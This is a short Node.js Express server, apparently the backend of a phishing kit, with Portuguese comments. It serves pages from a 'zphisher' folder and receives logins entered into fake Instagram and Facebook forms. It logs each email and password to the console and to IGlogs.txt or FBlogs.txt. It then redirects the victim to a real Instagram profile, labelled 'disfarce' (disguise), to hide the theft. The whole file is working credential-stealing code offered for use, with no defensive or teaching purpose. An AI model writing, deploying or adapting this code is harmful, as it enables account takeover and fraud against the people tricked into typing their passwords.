const bodyParser = require("body-parser");
const express = require("express")
const app = express()
const port = 80
let fs = require('fs');


const disfarce = "https://www.instagram.com/emagrecer.com.receitas/"

app.use(express.static(__dirname+'/zphisher'));

app.use(bodyParser.urlencoded({extended:true}))
app.use(bodyParser.json())



app.post('/login',(req,res)=>{
    email = req.body.email
    senha = req.body.pass
   console.log(`\nInstagram\nEmail: ${email}\nSenha: ${senha}\n`)

   fs.appendFile('IGlogs.txt',`Instagram\n----------\nEmail: ${email}\nSenha: ${senha}\n\n`, function (err) {
    if (err) throw err;
    console.log('Salvo em IGlogs.txt');
  });


   res.redirect(disfarce)
})

app.post('/loginfb',(req,res)=>{
    email = req.body.email
    senha = req.body.pass
   console.log(`\nFacebook\nEmail: ${email}\nSenha: ${senha} \n`)
  //salva os logs do facebook em FBlogs.txt
   fs.appendFile('FBlogs.txt', `Facebook\n----------\nEmail: ${email}\nSenha: ${senha}\n\n`, function (err) {
    if (err) throw err;
    console.log('Salvo em FBlogs.txt');
  });



   res.redirect(disfarce)
})


app.listen(port,()=>{
    console.log("\nhttp://localhost:"+port)
})
